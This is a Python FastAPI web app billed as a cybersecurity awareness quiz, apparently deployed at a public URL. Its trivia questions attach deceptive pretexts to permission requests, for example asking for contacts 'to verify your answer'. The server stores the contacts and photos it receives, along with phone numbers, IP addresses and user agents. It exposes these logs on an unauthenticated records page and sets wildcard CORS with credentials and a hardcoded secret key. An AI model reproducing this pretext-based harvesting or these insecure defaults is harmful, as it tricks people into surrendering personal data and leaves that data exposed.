# app.py - FastAPI version
"""
Cybersecurity Awareness Demo - Real Data Access Demonstration
This educational tool shows users what data they expose when granting permissions.
Accesses REAL user data (contacts, photos) with explicit user consent.
"""

import os
import json
import sqlite3
import datetime
import base64
import hashlib
import random
import string
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import qrcode
from io import BytesIO
import uvicorn

app = FastAPI()

# CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Secret key for sessions (in production, use environment variable)
SECRET_KEY = 'cybersecurity_awareness_2026_demo_key'

# Create templates folder if it doesn't exist
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
if not os.path.exists(TEMPLATE_DIR):
    os.makedirs(TEMPLATE_DIR)

templates = Jinja2Templates(directory=TEMPLATE_DIR)

# Database setup for tracking consents
def init_db():
    conn = sqlite3.connect('user_consent_records.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS consent_records
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  session_id TEXT,
                  phone_number TEXT,
                  consent_timestamp TEXT,
                  data_type TEXT,
                  data_hash TEXT,
                  ip_address TEXT,
                  user_agent TEXT)''')
    conn.commit()
    conn.close()

init_db()

# In-memory storage for user data (cleared after session)
user_data_store = {}

# Quiz questions that disguise permission requests
QUIZ_QUESTIONS = [
    {
        'id': 1,
        'question': 'Who is the current President of India?',
        'options': ['Droupadi Murmu', 'Ram Nath Kovind'],
        'correct': 0,
        'permission': 'contacts',
        'permission_text': 'To verify your answer and send you the result via your contacts'
    },
    {
        'id': 2,
        'question': 'What is the capital of France?',
        'options': ['London', 'Paris'],
        'correct': 1,
        'permission': 'location',
        'permission_text': 'To show you the distance from your location to the answer'
    },
    {
        'id': 3,
        'question': 'Which planet is known as the Red Planet?',
        'options': ['Venus', 'Mars'],
        'correct': 1,
        'permission': 'photos',
        'permission_text': 'To unlock a special photo gallery of space images'
    },
    {
        'id': 4,
        'question': 'How many continents are there?',
        'options': ['5', '7'],
        'correct': 1,
        'permission': 'wifi_scan',
        'permission_text': 'To verify your network connection for quiz results'
    },
    {
        'id': 5,
        'question': 'What year did World War II end?',
        'options': ['1945', '1939'],
        'correct': 0,
        'permission': 'device_info',
        'permission_text': 'To optimize the quiz experience for your device'
    },
    {
        'id': 6,
        'question': 'Which is the largest ocean on Earth?',
        'options': ['Atlantic Ocean', 'Pacific Ocean'],
        'correct': 1,
        'permission': 'photos',
        'permission_text': 'To show you ocean images from your collection'
    }
]

# Pydantic models for request validation
class AnswerSubmission(BaseModel):
    question_id: int
    selected_option: int
    session_id: str

class PermissionRequest(BaseModel):
    permission_type: str
    session_id: str
    phone_number: str = ''

class ContactUpload(BaseModel):
    session_id: str
    contacts: list

class PhotoUpload(BaseModel):
    session_id: str
    photos: list

@app.get('/', response_class=HTMLResponse)
async def index(request: Request):
    """Home page with QR code for mobile access"""
    try:
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data('https://public-awarness-demo.onrender.com/quiz')
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        qr_base64 = base64.b64encode(buffered.getvalue()).decode()

        return templates.TemplateResponse(request, 'index.html', {'qr_code': qr_base64})
    except Exception as e:
        print(f"Error in index route: {e}")
        import traceback
        traceback.print_exc()
        raise HTTPException(status_code=500, detail=str(e))

@app.get('/quiz', response_class=HTMLResponse)
async def quiz(request: Request):
    """Quiz page where users grant permissions"""
    # Generate a random session ID
    session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    # Pick a random question
    question = random.choice(QUIZ_QUESTIONS)

    return templates.TemplateResponse(request, 'quiz_new.html', {'session_id': session_id, 'question': question})

@app.get('/get_question')
async def get_question():
    """Get a random quiz question"""
    question = random.choice(QUIZ_QUESTIONS)
    return JSONResponse(content=question)

@app.post('/submit_answer')
async def submit_answer(answer: AnswerSubmission):
    """Process quiz answer and request permission"""
    # Find the question
    question = next((q for q in QUIZ_QUESTIONS if q['id'] == answer.question_id), None)

    if not question:
        return JSONResponse(content={'status': 'error', 'message': 'Invalid question'}, status_code=400)

    # Check if answer is correct
    is_correct = (answer.selected_option == question['correct'])

    # Store answer in session
    if answer.session_id not in user_data_store:
        user_data_store[answer.session_id] = {'answers': []}

    user_data_store[answer.session_id]['answers'].append({
        'question_id': answer.question_id,
        'selected_option': answer.selected_option,
        'is_correct': is_correct,
        'permission_requested': question['permission']
    })

    return JSONResponse(content={
        'status': 'success',
        'is_correct': is_correct,
        'permission': question['permission'],
        'permission_text': question['permission_text']
    })

@app.post('/request_permission')
async def request_permission(request: Request, perm_req: PermissionRequest):
    """Handle permission requests and store consent"""
    # Get client info
    client_host = request.client.host
    user_agent = request.headers.get('user-agent', '')

    # Store consent record
    conn = sqlite3.connect('user_consent_records.db')
    c = conn.cursor()
    c.execute("""INSERT INTO consent_records
                 (session_id, phone_number, consent_timestamp, data_type, ip_address, user_agent)
                 VALUES (?, ?, ?, ?, ?, ?)""",
              (perm_req.session_id, perm_req.phone_number, datetime.datetime.now().isoformat(),
               perm_req.permission_type, client_host, user_agent))
    conn.commit()
    conn.close()

    # Store permission type in session for this user
    if perm_req.session_id not in user_data_store:
        user_data_store[perm_req.session_id] = {}
    user_data_store[perm_req.session_id]['permission'] = perm_req.permission_type
    user_data_store[perm_req.session_id]['phone_number'] = perm_req.phone_number

    return JSONResponse(content={
        'status': 'success',
        'message': 'Permission granted',
        'permission_type': perm_req.permission_type
    })

@app.post('/upload_contacts')
async def upload_contacts(contact_upload: ContactUpload):
    """Endpoint for receiving contact data from client"""
    session_id = contact_upload.session_id
    contacts = contact_upload.contacts

    if session_id not in user_data_store:
        user_data_store[session_id] = {}

    user_data_store[session_id]['contacts'] = contacts
    user_data_store[session_id]['contact_count'] = len(contacts)

    # Hash the data for tracking
    data_hash = hashlib.sha256(json.dumps(contacts).encode()).hexdigest()

    # Update database with hash
    conn = sqlite3.connect('user_consent_records.db')
    c = conn.cursor()
    c.execute("UPDATE consent_records SET data_hash = ? WHERE session_id = ?",
              (data_hash, session_id))
    conn.commit()
    conn.close()

    return JSONResponse(content={
        'status': 'success',
        'message': f'Received {len(contacts)} contacts',
        'contact_count': len(contacts)
    })

@app.post('/upload_photos')
async def upload_photos(photo_upload: PhotoUpload):
    """Endpoint for receiving photo data from client"""
    session_id = photo_upload.session_id
    photos = photo_upload.photos

    if session_id not in user_data_store:
        user_data_store[session_id] = {}

    user_data_store[session_id]['photos'] = photos
    user_data_store[session_id]['photo_count'] = len(photos)

    # Hash the data for tracking
    data_hash = hashlib.sha256(json.dumps(photos).encode()).hexdigest()

    # Update database with hash
    conn = sqlite3.connect('user_consent_records.db')
    c = conn.cursor()
    c.execute("UPDATE consent_records SET data_hash = ? WHERE session_id = ?",
              (data_hash, session_id))
    conn.commit()
    conn.close()

    return JSONResponse(content={
        'status': 'success',
        'message': f'Received {len(photos)} photos',
        'photo_count': len(photos)
    })

@app.get('/show_data/{session_id}', response_class=HTMLResponse)
async def show_data(request: Request, session_id: str):
    """Display collected data to the user"""
    if session_id not in user_data_store:
        return templates.TemplateResponse(request, 'error.html', {'message': 'Session not found'})

    data = user_data_store.get(session_id, {})
    return templates.TemplateResponse(request, 'show_data.html', {'data': data, 'session_id': session_id})

@app.get('/education', response_class=HTMLResponse)
async def education(request: Request):
    """Educational page showing security best practices"""
    return templates.TemplateResponse(request, 'education.html', {})

@app.get('/records', response_class=HTMLResponse)
async def records(request: Request):
    """Admin page showing all consent records"""
    conn = sqlite3.connect('user_consent_records.db')
    c = conn.cursor()
    c.execute("SELECT * FROM consent_records ORDER BY id DESC LIMIT 50")
    records_data = c.fetchall()
    conn.close()

    return templates.TemplateResponse(request, 'records.html', {'records': records_data})

# Create template files (same as Flask version, just update any Flask-specific syntax)
def create_templates():
    """Create all HTML template files"""
    # Note: Your existing templates should work fine with FastAPI's Jinja2
    # The only change needed is that request must be passed explicitly
    print("[OK] Templates loaded from templates/ directory")

# Load templates on startup
create_templates()

if __name__ == '__main__':
    print("=" * 70)
    print(" Cybersecurity Awareness Quiz - Educational Demo (FastAPI)")
    print("=" * 70)
    print(" Access the app at: https://public-awarness-demo.onrender.com")
    print(" Quiz shows how apps trick users into granting permissions")
    print("=" * 70)

    # Get port from environment or use 8001
    port = int(os.getenv('PORT', 8001))

    uvicorn.run(app, host='0.0.0.0', port=port)
